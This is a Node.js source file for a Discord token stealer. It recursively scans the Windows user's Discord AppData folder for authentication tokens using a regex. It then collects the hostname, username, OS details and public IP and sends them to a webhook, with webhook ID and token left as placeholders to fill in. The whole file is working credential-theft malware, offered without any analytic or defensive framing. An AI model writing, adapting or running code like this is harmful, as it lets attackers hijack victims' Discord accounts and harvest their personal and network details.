//Dependencies
const Public_IP = require("public-ip")
const Discord = require("discord.js")
const Path = require("path")
const Os = require("os")
const Fs = require("fs")

//Variables
const Webhook = new Discord.WebhookClient("webhook_id", "webhook_token")

var Self = {
    homedir: Os.userInfo().homedir,
    regex: new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/, "g"),
    tokens: ""
}

//Functions
function directory_files(dir, done) {
    var results = []

    Fs.readdir(dir, function (err, list) {
        if (err) return done(err)

        var list_length = list.length

        if (!list_length) return done(null, results)

        list.forEach(function (file) {
            file = Path.resolve(dir, file)

            Fs.stat(file, function (err, stat) {
                if (stat && stat.isDirectory()) {
                    directory_files(file, function (err, res) {
                        results = results.concat(res)

                        if (!--list_length) done(null, results)
                    })
                } else {
                    results.push(file)
                    
                    if (!--list_length) done(null, results)
                }
            })
        })
    })
}

Self.send = async function(){
    const IP = await Public_IP.v4()

    Webhook.send("```" + `OS Type: ${Os.type()}
OS Platform: ${Os.platform()}
OS Hostname: ${Os.hostname()}
            
OS Username: ${Os.userInfo().username}
IP: ${IP}
Discord tokens found: ${Self.tokens}` + "```",).then(()=>{
        process.exit()
    }).catch(()=>{
        process.exit()
    })
}

//Main
if(!Fs.existsSync(`${Self.homedir}\\AppData\\Roaming\\discord`)){
    process.exit()
}

directory_files(`${Self.homedir}\\AppData\\Roaming\\discord`, function(err, files){
    if(err){
        process.exit()
    }

    files.forEach(file =>{
        const data = Fs.readFileSync(file, "utf8")
        
        if(data.match(Self.regex)){
            for( i in data.match(Self.regex) ){
                if(Self.tokens.indexOf(data.match(Self.regex)[i]) == -1){}

                if(!Self.tokens.length){
                    Self.tokens = data.match(Self.regex)[i]
                }else{
                    Self.tokens += `\n${data.match(Self.regex)[i]}`
                }
            }
        }
    })

    Self.send()
})
